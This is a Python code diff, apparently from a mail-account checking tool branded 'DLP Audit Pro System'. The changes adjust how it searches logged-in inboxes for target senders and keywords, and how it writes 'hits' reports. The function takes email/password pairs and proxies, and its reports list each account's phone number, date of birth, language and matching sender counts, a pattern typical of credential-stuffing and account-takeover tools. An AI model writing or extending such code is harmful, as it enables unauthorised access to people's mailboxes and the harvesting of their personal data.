@@ -616,8 +616,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
         for i in range(0, len(target_senders), chunk_size):
             chunk = target_senders[i:i+chunk_size]
             or_query = " OR ".join([f"from:{s}" for s in chunk])
-            # Solo buscar en Remitentes para acelerar y enfocar
-            query_string = f'({or_query})'
+            query_string = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
             
             payload = search_payload_tmpl.copy()
             payload["EntityRequests"][0]["Query"]["QueryString"] = query_string
@@ -705,7 +704,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
             f"🗣️ Idioma: {language}\n"
             f"📱 Teléf: {phone}\n\n"
             f"📊 Mensajes: {subject_count}\n"
-            f"🔍 Búsqueda: from:{', from:'.join(target_senders) if getattr(globals(),'target_senders',[]) else 'N/A'}\n"
+            f"🔍 Búsqueda: from:{', from:'.join(target_senders) if target_senders else 'N/A'}\n"
             f"🤖 DLP Audit Pro System"
         )
         
@@ -885,10 +884,12 @@ def send_consolidated_report(hits):
                     f.write(f"DOB: {h.get('dob', 'N/A')} | TELEFONO: {h.get('phone', 'N/A')}\n")
                     senders = h.get('senders', 'N/A')
                     msgs = h.get('messages', 'N/A')
+                    f.write(f"📧 REMITENTES OBJETIVO ({msgs} emails encontrados):\n")
                     if senders != 'N/A':
-                        f.write(f"📧 REMITENTES OBJETIVO ({msgs} emails encontrados):\n")
                         for s_entry in senders.split(", "):
                             f.write(f"   → {s_entry}\n")
+                    else:
+                        f.write(f"   → Ninguno encontrado en inbox\n")
                     f.write("-" * 50 + "\n")
                 f.write("\n\n")
 
